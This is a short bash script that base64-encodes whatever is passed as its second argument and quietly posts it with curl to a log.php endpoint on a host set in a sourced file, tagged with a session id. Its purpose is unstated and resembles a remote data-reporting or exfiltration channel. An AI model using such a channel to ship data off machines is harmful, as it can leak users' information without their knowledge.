#!/bin/bash

source http

encript=$(echo -ne "$2" | base64 -w 0);

echo $encript

curl -s $ip'/log.php?session='$1'&log='$encript
